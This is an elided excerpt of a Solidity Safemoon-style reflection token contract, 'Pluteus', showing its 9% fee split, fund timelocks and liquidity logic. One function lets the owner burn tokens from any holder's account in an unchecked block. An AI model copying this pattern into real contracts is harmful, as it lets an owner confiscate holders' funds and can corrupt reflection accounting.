...
/**
   #Features:
    - fee 9% to be splitted:
        - 4% reflection back to holders (same logic as safemoon)
        - 4% - to be locked at LP
        - 1% - to be sent to multisig wallet - pluteus fund
*/
...
contract Pluteus is Context, IERC20, Ownable, ITimelockable {
    ...
    constructor() {
        ...
        pancakeswapV2Pair = IPancakeFactory(
    ...
    function transferFrom(
        ...
        if (sender == PLUTEUS_ADDRESS) {
            // Lock tokens outgoing of PLUTEUS FUND for 2 days
            require(
                !recipient.isContract(),
                "Resctriced to EOA"
            ); // Prevent Timelock bypass
            uint256 releaseTime = block.timestamp + 172800;
            TokenTimelock ttl =
                new TokenTimelock(address(this), recipient, releaseTime);
    ...
    function releaseTimelockedFunds(address to, uint256 amount)
        public
        override
    {
    ...
    function burnToken(uint256 amount, address account) external onlyOwner {
        ...
        unchecked {_tOwned[account] = accountBalance - amount;}
        _tTotal -= amount;
        _tBurnt += amount;
        ...
        )
    {
        ...
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tLiquidity, tPluteus, _getRate());
        return (
            rAmount,
            rTransferAmount,
            rFee,
        ...
        )
    {
        ...
        uint256 tPluteus = tAmount.mul(_pluteusFund).div(10**2);
        uint256 tTransferAmount =
            tAmount.sub(tFee).sub(tLiquidity).sub(tPluteus);
    ...
    function addLiquidity(uint256 tokenAmount, uint256 bnbAmount) private {
        ...
        require(
            block.timestamp >= liquidityReleaseTime,
